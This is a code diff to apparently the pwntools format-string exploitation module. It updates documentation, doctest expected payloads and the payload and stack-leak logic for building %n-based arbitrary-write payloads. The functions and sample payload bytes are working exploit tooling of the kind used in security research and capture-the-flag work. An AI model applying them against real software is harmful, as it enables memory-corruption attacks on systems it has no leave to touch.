@@ -33,6 +33,9 @@ Let's use this program as an example:
 
 We can automate the exploitation of the process like so:
 
+.. doctest::
+    :options: +POSIX +TODO
+
     >>> program = pwnlib.data.elf.fmtstr.get('i386')
     >>> def exec_fmt(payload):
     ...     p = process(program)
@@ -95,7 +98,6 @@ from __future__ import division
 import logging
 import re
 from operator import itemgetter
-from six.moves import range
 from sortedcontainers import SortedList
 
 from pwnlib.log import getLogger
@@ -841,6 +843,12 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_
     The overflows argument is a format-string-length to output-amount tradeoff:
     Larger values for ``overflows`` produce shorter format strings that generate more output at runtime.
 
+    The writes argument is a dictionary with address/value pairs like ``{addr: value, addr2: value2}``.
+    If the value is an ``int`` datatype, it will be automatically casted into a bytestring with the length of a ``long`` (8 bytes in 64-bit, 4 bytes in 32-bit).
+    If a specific number of bytes is intended to be written (such as only a single byte, single short, or single int and not an entire long),
+    then provide a bytestring like ``b'\x37\x13'`` or ``p16(0x1337)``.
+    Note that the ``write_size`` argument does not determine **total** bytes written, only the size of each consecutive write.
+
     Arguments:
         offset(int): the first formatter's offset you control
         writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
@@ -856,44 +864,43 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_
 
         >>> context.clear(arch = 'amd64')
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
-        b'%322419390c%2$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'
+        b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'
+	>>> fmtstr_payload(1, {0x0: p32(0x1337babe)}, write_size='int')
+        b'%322419390c%3$na\x00\x00\x00\x00\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
-        b'%47806c%3$lln%22649c%4$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
+        b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
-        b'%190c%5$lln%85c%6$hhn%36c%7$hhn%131c%8$hhnaaaaba\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
-        >>> fmtstr_payload(6, {0x8: 0x55d15d2004a0}, badbytes=b"\n")
-        b'%1184c%12$lln%49c%13$hhn%6963c%14$hn%81c%15$hhn%8c%16$hhnaaaabaa\x08\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00'
+        b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
+        >>> fmtstr_payload(6, {0x8: 0x55d15d2004a0}, badbytes=b'\n')
+        b'%1184c%14$lln%49c%15$hhn%6963c%16$hn%81c%17$hhn%8c%18$hhnaaaabaa\x08\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00'
         >>> context.clear(arch = 'i386')
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
-        b'%322419390c%2$na\x00\x00\x00\x00'
+        b'%322419390c%5$na\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
-        b'%4919c%4$hn%42887c%5$hna\x02\x00\x00\x00\x00\x00\x00\x00'
+        b'%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
-        b'%19c%9$hhn%36c%10$hhn%131c%11$hhn%4c%12$hhna\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
+        b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')
-        b'c%0$naaa\x00\x00\x00\x00'
-        >>> fmtstr_payload(1, {0x0: b'ÿÿ\x04\x11\x00\x00\x00\x00'}, write_size='short')
-        b'%327679c%4$lln%18c%5$hhn\x00\x00\x00\x00\x03\x00\x00\x00'
+        b'c%3$naaa\x00\x00\x00\x00'
+	>>> fmtstr_payload(1, {0x0: b'\x01'}, write_size='byte')
+	b'c%3$hhna\x00\x00\x00\x00'
+        >>> fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')
+        b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'
         >>> fmtstr_payload(10, {0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef}, no_dollars=True)
-        b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%131c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc>@@\x00cccc=@@\x00cccc?@@\x00cccc<@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00'
+        b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc>@@\x00cccc=@@\x00cccc?@@\x00cccc<@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00'
         >>> fmtstr_payload(6, {0x404048 : 0xbadbad00}, no_dollars=True)
-        b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%235c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00'
+        b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00'
         >>> fmtstr_payload(6, {0x4040 : 0xbadbad00, 0x4060: 0xbadbad02}, no_dollars=True)
-        b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%218c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00'
+        b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00'
     """
     sz = WRITE_SIZE[write_size]
     szmax = WRITE_SIZE[write_size_max]
     all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)
 
     fmt = b""
-    # Predict the size of bytes to substract.
-    # We consider that the pattern ``START%XXX$pEND`` is always used.
-    # This is because ``prefix`` got placed after ``payload``.
-    search_pattern = "START%%%d$pEND" % offset
-    reverse_offset = len(search_pattern) + (len(search_pattern) % context.bytes)
     for _ in range(1000000):
         data_offset = (offset_bytes + len(fmt)) // context.bytes
-        fmt, data = make_payload_dollar(offset + data_offset - (reverse_offset // context.bytes), all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)
+        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)
         fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)
 
         if len(fmt) + offset_bytes == data_offset * context.bytes:
@@ -940,7 +947,7 @@ class FmtStr(object):
 
     def leak_stack(self, offset, prefix=b""):
         payload = b"START%%%d$pEND" % offset
-        leak = self.execute_fmt(payload + prefix)
+        leak = self.execute_fmt(prefix + payload)
         try:
             leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
             leak = int(leak, 16)
@@ -972,16 +979,12 @@ class FmtStr(object):
             return b"\x7f"
 
         fmtstr = fit({
-          self.padlen: b"START%%%d$sEND" % (self.offset),
+          self.padlen: b"START%%%d$sEND" % (self.offset + 16//context.bytes),
           16 + self.padlen: addr
         })
 
         leak = self.execute_fmt(fmtstr)
-        try:
-            leak = re.findall(br"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
-        except IndexError:
-            # FIXME: Let's hope not to find a collision :)
-            leak = leak[leak.find(b'START') + 5:]
+        leak = re.findall(br"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
 
         leak += b"\x00"
 
@@ -1008,7 +1011,7 @@ class FmtStr(object):
 
         Arguments:
             addr(int): the address where you want to write
-            data(int): the data that you want to write ``addr``
+            data(int or bytes): the data that you want to write ``addr``
 
         Returns:
             None
@@ -1022,6 +1025,10 @@ class FmtStr(object):
             >>> f.write(0x08040506, 0x1337babe)
             >>> f.execute_writes()
             b'%19c%16$hhn%36c%17$hhn%131c%18$hhn%4c%19$hhn\t\x05\x04\x08\x08\x05\x04\x08\x07\x05\x04\x08\x06\x05\x04\x08'
+            >>> f2 = FmtStr(send_fmt_payload, offset=5)
+            >>> f2.write(0x08040506, p16(0x1337))
+            >>> f2.execute_writes()
+            b'%19c%11$hhn%36c%12$hhnaa\x07\x05\x04\x08\x06\x05\x04\x08'
 
         """
         self.writes[addr] = data
